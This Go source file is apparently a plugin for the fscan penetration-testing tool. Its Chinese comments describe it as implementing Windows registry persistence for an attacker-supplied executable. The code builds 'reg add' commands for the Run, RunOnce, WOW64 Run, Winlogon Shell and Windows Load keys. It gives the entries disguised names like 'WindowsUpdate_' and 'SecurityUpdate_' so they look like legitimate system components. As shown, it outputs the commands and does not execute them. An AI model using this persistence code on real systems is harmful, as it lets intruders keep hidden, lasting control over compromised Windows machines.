//go:build (plugin_winregistry || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

// WinRegistryPlugin Windows注册表持久化插件
// 设计哲学：直接实现，删除过度设计
// - 删除复杂的继承体系
// - 直接实现注册表持久化功能
// - 保持原有功能逻辑
type WinRegistryPlugin struct {
	plugins.BasePlugin
}

// NewWinRegistryPlugin 创建Windows注册表持久化插件
func NewWinRegistryPlugin() *WinRegistryPlugin {
	return &WinRegistryPlugin{
		BasePlugin: plugins.NewBasePlugin("winregistry"),
	}
}

// Scan 执行Windows注册表持久化 - 直接实现
func (p *WinRegistryPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	config := session.Config
	state := session.State
	var output strings.Builder

	if runtime.GOOS != "windows" {
		output.WriteString("Windows注册表持久化只支持Windows平台\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("不支持的平台: %s", runtime.GOOS),
		}
	}

	// 从config获取配置
	pePath := config.WinPEFile
	if pePath == "" {
		output.WriteString("必须通过 -win-pe 参数指定PE文件路径\n")
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("未指定PE文件"),
		}
	}

	// 检查目标文件是否存在
	if _, err := os.Stat(pePath); os.IsNotExist(err) {
		output.WriteString(fmt.Sprintf("PE文件不存在: %s\n", pePath))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	// 检查文件类型
	if !p.isValidPEFile(pePath) {
		output.WriteString(fmt.Sprintf("目标文件必须是PE文件(.exe或.dll): %s\n", pePath))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   fmt.Errorf("无效的PE文件"),
		}
	}

	output.WriteString("=== Windows注册表持久化 ===\n")
	output.WriteString(fmt.Sprintf("PE文件: %s\n", pePath))
	output.WriteString(fmt.Sprintf("平台: %s\n\n", runtime.GOOS))

	// 创建注册表持久化
	registryKeys, err := p.createRegistryPersistence(pePath)
	if err != nil {
		output.WriteString(fmt.Sprintf("创建注册表持久化失败: %v\n", err))
		return &plugins.Result{
			Success: false,
			Output:  output.String(),
			Error:   err,
		}
	}

	output.WriteString(fmt.Sprintf("创建了%d个注册表持久化项:\n", len(registryKeys)))
	for i, key := range registryKeys {
		output.WriteString(fmt.Sprintf("  %d. %s\n", i+1, key))
	}
	output.WriteString("\n✓ Windows注册表持久化完成\n")

	common.LogSuccess(i18n.Tr("winregistry_success", len(registryKeys)))

	return &plugins.Result{
		Success: true,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
		Error:   nil,
	}
}

// createRegistryPersistence 创建注册表持久化
func (p *WinRegistryPlugin) createRegistryPersistence(pePath string) ([]string, error) {
	absPath, err := filepath.Abs(pePath)
	if err != nil {
		return nil, fmt.Errorf("failed to get absolute path: %w", err)
	}

	var registryEntries []string
	baseName := filepath.Base(absPath)
	baseNameNoExt := baseName[:len(baseName)-len(filepath.Ext(baseName))]

	registryKeys := []struct {
		hive        string
		key         string
		valueName   string
		description string
	}{
		{
			hive:        "HKEY_CURRENT_USER",
			key:         `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
			valueName:   fmt.Sprintf("WindowsUpdate_%s", baseNameNoExt),
			description: "Current User Run Key",
		},
		{
			hive:        "HKEY_LOCAL_MACHINE",
			key:         `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`,
			valueName:   fmt.Sprintf("SecurityUpdate_%s", baseNameNoExt),
			description: "Local Machine Run Key",
		},
		{
			hive:        "HKEY_CURRENT_USER",
			key:         `SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`,
			valueName:   fmt.Sprintf("SystemInit_%s", baseNameNoExt),
			description: "Current User RunOnce Key",
		},
		{
			hive:        "HKEY_LOCAL_MACHINE",
			key:         `SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`,
			valueName:   fmt.Sprintf("AppUpdate_%s", baseNameNoExt),
			description: "WOW64 Run Key",
		},
		{
			hive:        "HKEY_LOCAL_MACHINE",
			key:         `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`,
			valueName:   "Shell",
			description: "Winlogon Shell Override",
		},
		{
			hive:        "HKEY_CURRENT_USER",
			key:         `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`,
			valueName:   "Load",
			description: "Windows Load Key",
		},
	}

	for _, regKey := range registryKeys {
		var regCommand string
		var value string

		switch regKey.valueName {
		case "Shell":
			value = fmt.Sprintf("explorer.exe,%s", absPath)
		case "Load":
			value = absPath
		default:
			value = fmt.Sprintf(`"%s"`, absPath)
		}

		regCommand = fmt.Sprintf(`reg add "%s\%s" /v "%s" /t REG_SZ /d "%s" /f`,
			regKey.hive, regKey.key, regKey.valueName, value)

		registryEntries = append(registryEntries, fmt.Sprintf("[%s] %s", regKey.description, regCommand))
	}

	return registryEntries, nil
}

// isValidPEFile 检查是否为有效的PE文件
func (p *WinRegistryPlugin) isValidPEFile(filePath string) bool {
	ext := strings.ToLower(filepath.Ext(filePath))
	return ext == ".exe" || ext == ".dll"
}

// 注册插件
func init() {
	RegisterLocalPlugin("winregistry", func() Plugin {
		return NewWinRegistryPlugin()
	})
}
